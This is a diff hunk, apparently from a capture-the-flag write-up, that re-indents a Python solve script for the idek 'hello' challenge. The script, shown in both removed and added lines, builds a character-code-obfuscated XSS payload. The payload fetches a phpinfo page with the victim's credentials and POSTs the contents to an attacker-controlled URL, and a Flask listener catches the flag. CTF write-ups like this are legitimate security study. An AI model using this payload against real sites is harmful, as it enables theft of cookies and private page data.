@@ -347,62 +347,62 @@ To catch the exfiltrated `FLAG` cookie's value, I wrote a solve script to genera
 <details>
     <summary>solve.py</summary>
 
-    ```python
-    #!/usr/bin/env python3
-    import re
-    import argparse
-    from flask import Flask, request
+```python
+#!/usr/bin/env python3
+import re
+import argparse
+from flask import Flask, request
+
+def parseArguments():
+    from pathlib import Path
+
+    defaultTargetBaseUrl = 'idek-hello.chal.idek.team:1337'
+    argumentParser = argparse.ArgumentParser(Path(__file__).name)
+    argumentParser.add_argument('-t', '--target-base', metavar='URL' , help=f'Target base URL. Default: "{defaultTargetBaseUrl}"', type=str, dest='targetBaseUrl', default=defaultTargetBaseUrl)
+    argumentParser.add_argument('-a', '--attacker-url', metavar='URL' , help='Attacker URL, such as "https://aaaa-123-456-789-123.ngrok-free.app"', type=str, required=True, dest='attackerUrl')
+    arguments = argumentParser.parse_args()
+    return arguments
+
+def stringToAsciiCode(string):
+    allAsciiCode = str()
+    for character in string:
+        allAsciiCode += str(ord(character)) + ','
+    return allAsciiCode[:-1]
+
+def generatePayload(targetBaseUrl, attackerUrl):
+    phpInfoUrl = f'http://{targetBaseUrl}/info.php/.php'
+    payload = f'http://{targetBaseUrl}/?name=<img%0Csrc=x%0Conerror="fetch(String.fromCharCode({stringToAsciiCode(phpInfoUrl)}),{{credentials:\'include\'}}).then(response => response.text()).then(data => fetch(String.fromCharCode({stringToAsciiCode(attackerUrl)}),{{method:\'POST\',body:JSON.stringify({{text:data}})}}));">'
     
-    def parseArguments():
-        from pathlib import Path
-    
-        defaultTargetBaseUrl = 'idek-hello.chal.idek.team:1337'
-        argumentParser = argparse.ArgumentParser(Path(__file__).name)
-        argumentParser.add_argument('-t', '--target-base', metavar='URL' , help=f'Target base URL. Default: "{defaultTargetBaseUrl}"', type=str, dest='targetBaseUrl', default=defaultTargetBaseUrl)
-        argumentParser.add_argument('-a', '--attacker-url', metavar='URL' , help='Attacker URL, such as "https://aaaa-123-456-789-123.ngrok-free.app"', type=str, required=True, dest='attackerUrl')
-        arguments = argumentParser.parse_args()
-        return arguments
-    
-    def stringToAsciiCode(string):
-        allAsciiCode = str()
-        for character in string:
-            allAsciiCode += str(ord(character)) + ','
-        return allAsciiCode[:-1]
-    
-    def generatePayload(targetBaseUrl, attackerUrl):
-        phpInfoUrl = f'http://{targetBaseUrl}/info.php/.php'
-        payload = f'http://{targetBaseUrl}/?name=<img%0Csrc=x%0Conerror="fetch(String.fromCharCode({stringToAsciiCode(phpInfoUrl)}),{{credentials:\'include\'}}).then(response => response.text()).then(data => fetch(String.fromCharCode({stringToAsciiCode(attackerUrl)}),{{method:\'POST\',body:JSON.stringify({{text:data}})}}));">'
-        
-        return payload
-    
-    app = Flask(__name__)
-    
-    @app.route('/', methods=['GET', 'POST'])
-    def index():
-        if request.method != 'POST':
-            return ''
-        
-        print('[+] Received a POST request. Searching for the flag...')
-        
-        FLAG_REGEX_PATTERN = re.compile('(idek{[!-z]*})')
-        flagMatch = re.search(FLAG_REGEX_PATTERN, request.data.decode())
-        if not flagMatch:
-            print(f'[-] Couldn\'t get fhe flag')
-            return ''
-        
-        flag = flagMatch.group(1)
-        print(f'[+] Here\'s the flag: {flag}')
+    return payload
+
+app = Flask(__name__)
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method != 'POST':
         return ''
     
-    if __name__ == '__main__':
-        arguments = parseArguments()
-        
-        generatedPayload = generatePayload(arguments.targetBaseUrl, arguments.attackerUrl)
-        print(f'[*] Send the following payload to the admin bot:\n{generatedPayload}')
+    print('[+] Received a POST request. Searching for the flag...')
     
-        print('[*] Waiting for incoming request...')
-        app.run('0.0.0.0', port=80)
-    ```
+    FLAG_REGEX_PATTERN = re.compile('(idek{[!-z]*})')
+    flagMatch = re.search(FLAG_REGEX_PATTERN, request.data.decode())
+    if not flagMatch:
+        print(f'[-] Couldn\'t get fhe flag')
+        return ''
+    
+    flag = flagMatch.group(1)
+    print(f'[+] Here\'s the flag: {flag}')
+    return ''
+
+if __name__ == '__main__':
+    arguments = parseArguments()
+    
+    generatedPayload = generatePayload(arguments.targetBaseUrl, arguments.attackerUrl)
+    print(f'[*] Send the following payload to the admin bot:\n{generatedPayload}')
+
+    print('[*] Waiting for incoming request...')
+    app.run('0.0.0.0', port=80)
+```
 
 </details>
 
